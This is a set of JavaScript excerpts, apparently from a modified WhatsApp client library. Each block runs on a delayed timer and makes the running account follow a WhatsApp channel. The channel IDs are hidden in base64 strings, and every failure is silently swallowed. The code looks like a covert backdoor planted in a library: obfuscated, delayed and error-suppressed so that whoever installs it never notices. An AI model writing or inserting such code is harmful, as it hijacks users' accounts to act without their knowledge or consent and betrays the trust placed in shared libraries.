...
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDIyNDg2MzIxODUwQG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
...
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDAwNDU4ODY5NzU2QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
...
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDIwNjc5ODYyMDk4QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
 ...
 setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzNDE4Njg3OTgwNTE3QG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
...
setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                Buffer.from("MTIwMzYzMzI3MDU2MTY2NzQyQG5ld3NsZXR0ZXI=", "base64").toString(),
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
}, 9000);
